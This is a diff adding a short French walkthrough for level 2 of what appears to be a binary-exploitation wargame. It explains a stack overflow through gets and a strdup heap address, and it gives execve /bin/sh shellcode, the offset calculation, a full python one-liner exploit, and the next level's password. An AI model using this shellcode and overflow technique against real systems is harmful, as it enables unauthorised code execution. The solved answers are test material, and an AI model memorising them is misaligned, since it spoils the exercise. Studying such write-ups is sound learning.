@@ -1,0 +1,28 @@
+level2 : 
+
+let’s check the stack frame procedure 
+https://www.youtube.com/watch?v=Q2sFmqvpBe0
+
+l'idée est d’injecter notre code Shell dans l’adresse de retour. Nous profitons du strdup qui alloue du contenu dans une adresse de la heap. 
+Il faut donc procéder à plusieurs étapes : 
+récupérer l’address dans laquelle strdup store (elle est inchangée dans l’ISO)
+Utiliser cette address comme adresse de retour 
+Injecter le SHELLCODE en contenu de cette adresse grâce à strdup 
+
+De cette manière a la fin de la fonction p, l’adresse de retour appelée exécutera notre shellcode.
+
+Tout se passe au niveau du gets non protégé. Cette fonction nous permet d'écrire dans le buffer. Il suffit d'insérer le shellcode dans local_50 (buffer dans lequel on strdup) et remplacer la return address par cette adresse. 
+
+SHELLCODE : \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+calcule de l’offset :
+le buffer fait 76 de taille
+avant ca la variable uint est initialisee sur la stack d'une taille de 4 ENSUITE, il y a notre return adresse. 76 + 4 = 80.
+grace a gets : on positionne notre SHELLCODE de taille 25 au début du buffer il nous reste donc 80-25 = 55 pour atteindre le début de l'adresse de retour de la fonction p. on complète donc avec A x 55, puis on y cale notre nouvelle adresse de retour qui est celle dans laquelle alloue strdup.
+pour trouver l’adrese on lance ltrace ./level2
+
+(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 'A' * 55 + '\x08\xa0\x04\x08'"; cat) | ./level2
+
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
